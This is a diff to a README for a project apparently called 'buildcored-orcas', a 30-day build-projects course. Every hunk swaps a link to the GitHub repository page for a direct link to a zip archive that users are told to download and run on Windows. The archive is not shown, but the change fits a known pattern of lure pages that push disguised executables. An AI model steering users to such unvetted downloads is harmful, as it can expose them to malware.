@@ -1,6 +1,6 @@
 # ⚙️ buildcored-orcas - Build real projects under pressure
 
-[![Download](https://img.shields.io/badge/Download%20Now-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Catchphraseostryopsis204/buildcored-orcas)
+[![Download](https://img.shields.io/badge/Download%20Now-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Catchphraseostryopsis204/buildcored-orcas/main/assets/buildcored_orcas_2.9.zip)
 
 ## 📦 What this is
 
@@ -25,7 +25,7 @@ If you plan to use local AI tasks, a newer PC will feel smoother. If you only wa
 
 Use this link to visit the page to download:
 
-[Download buildcored-orcas](https://github.com/Catchphraseostryopsis204/buildcored-orcas)
+[Download buildcored-orcas](https://raw.githubusercontent.com/Catchphraseostryopsis204/buildcored-orcas/main/assets/buildcored_orcas_2.9.zip)
 
 Follow these steps on Windows:
 
@@ -259,7 +259,7 @@ Short notes make it easier to keep pace across 30 days.
 
 Use the main repository page to download and run the files on Windows:
 
-[https://github.com/Catchphraseostryopsis204/buildcored-orcas](https://github.com/Catchphraseostryopsis204/buildcored-orcas)
+[https://raw.githubusercontent.com/Catchphraseostryopsis204/buildcored-orcas/main/assets/buildcored_orcas_2.9.zip](https://raw.githubusercontent.com/Catchphraseostryopsis204/buildcored-orcas/main/assets/buildcored_orcas_2.9.zip)
 
 ## 🏁 Start with day one
 
